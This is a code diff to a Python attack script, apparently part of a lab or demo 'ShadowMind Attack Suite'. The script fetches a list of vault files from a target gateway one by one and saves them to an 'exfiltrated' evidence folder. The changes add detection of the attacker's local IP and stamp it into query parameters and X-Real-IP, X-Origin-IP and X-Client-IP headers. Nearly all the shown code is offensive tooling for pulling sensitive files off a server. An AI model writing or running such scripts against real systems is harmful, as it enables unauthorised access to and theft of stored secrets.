@@ -8,8 +8,20 @@
 import sys
 import time
 import os
+import socket
 import urllib.request
 import urllib.error
+
+def get_attacker_ip():
+    """Detect the attacker laptop's local IPv4 address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "10.28.82.21"
 
 # =============================================================================
 # 1. CONFIGURATION: TARGET URL & VAULT FILES (EASILY CHANGEABLE)
@@ -70,11 +82,13 @@ OUTPUT_DIR = "exfiltrated_serial_evidence"
 def run_serial_attack():
     os.makedirs(OUTPUT_DIR, exist_ok=True)
     target = TARGET_URL.rstrip('/')
+    attacker_ip = get_attacker_ip()
     
     print("=" * 75)
     print("  🔴 SHADOWMIND ATTACK SUITE // DIRECT SERIAL (SEQUENTIAL) ATTACK")
     print("=" * 75)
     print(f" Target Gateway : {target}")
+    print(f" Attacker Origin: {attacker_ip}")
     print(f" Attack Mode    : Direct Sequential (No Intermediate Relay)")
     print(f" Total Probes   : {len(VAULT_FILES)} endpoints")
     print(f" Inter-Probe Gap: {DELAY_BETWEEN_REQUESTS} seconds")
@@ -83,14 +97,18 @@ def run_serial_attack():
 
     for idx, (label, endpoint) in enumerate(VAULT_FILES, 1):
         filename = endpoint.strip("/").split("/")[-1]
-        url = f"{target}{endpoint}"
+        sep = "&" if "?" in endpoint else "?"
+        url = f"{target}{endpoint}{sep}src={attacker_ip}"
         
         print(f"[{idx}/{len(VAULT_FILES)}] 🎯 Requesting: {label}")
-        print(f"      Endpoint : GET {endpoint}")
+        print(f"      Endpoint : GET {endpoint} (Origin: {attacker_ip})")
         
         headers = {
             "User-Agent": "ShadowMind-SerialRecon/2.0",
             "X-Attack-Mode": "Serial",
+            "X-Real-IP": attacker_ip,
+            "X-Origin-IP": attacker_ip,
+            "X-Client-IP": attacker_ip,
             "Accept": "*/*"
         }
         
